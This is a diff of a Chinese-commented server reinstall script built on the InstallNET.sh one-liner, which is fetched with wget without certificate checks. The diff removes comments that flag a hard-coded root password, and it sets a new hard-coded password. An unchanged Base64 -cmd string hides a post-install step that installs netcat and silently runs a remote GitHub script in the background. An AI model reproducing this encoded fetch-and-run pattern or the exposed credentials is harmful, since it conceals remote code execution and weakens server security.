@@ -4,8 +4,6 @@
 sleep 120
 
 # 下面是核心命令，调用 InstallNET.sh 进行系统重装
-# 注意：这里的 -p 参数设置了硬编码密码 "X.myxiao23232369"，非常不安全！
-# -cmd 后面的 Base64 字符串已被修改，以指向你自己的 sijuly.sh
 bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) \
--d 12 -v 64 -a -p "X.myxiao23232369" -port 2233 \
+-d 12 -v 64 -a -p "P.myxiao232352648" -port 2233 \
 -cmd "IyEvYmluL2Jhc2gKIyBEZWJpYW4xMisKIyAxLiDmm7TmlrDova/ku7bljIXliJfooagKc3VkbyBhcHQgLXFxeSB1cGRhdGUgPi9kZXYvbnVsbCAyPiYxIHx8IGFwdCAtcXF5IHVwZGF0ZSA+L2Rldi9udWxsIDI+JjEKIyAyLiDlronoo4XluLjnlKjlt6XlhbfljIUKc3VkbyBhcHQgLXFxeSBpbnN0YWxsIHdnZXQgcHJvY3BzIHBzbWlzYyBsc29mIGNyb24gaWN1LWRldnRvb2xzIG5ldGNhdC10cmFkaXRpb25hbCBiaW5kOS1ob3N0ID4vZGV2L251bGwgMj4mMSB8fCBhcHQgLXFxeSBpbnN0YWxsIHdnZXQgcHJvY3BzIHBzbWlzYyBsc29mIGNyb24gaWN1LWRldnRvb2xzIG5ldGNhdC10cmFkaXRpb25hbCBiaW5kOS1ob3N0ID4vZGV2L251bGwgMj4mMQojIDMuIOaJp+ihjOS9oOWOn+adpeeahCBzaWp1bHkuc2gg6ISa5pysICjlkI7lj7Dov5DooYwpCmJhc2ggPCh3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgLXFPLSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbWFrbGlubmdmL20vcmVmcy9oZWFkcy9tYWluL20uc2gpID4vZGV2L251bGwgMj4mMSAm"
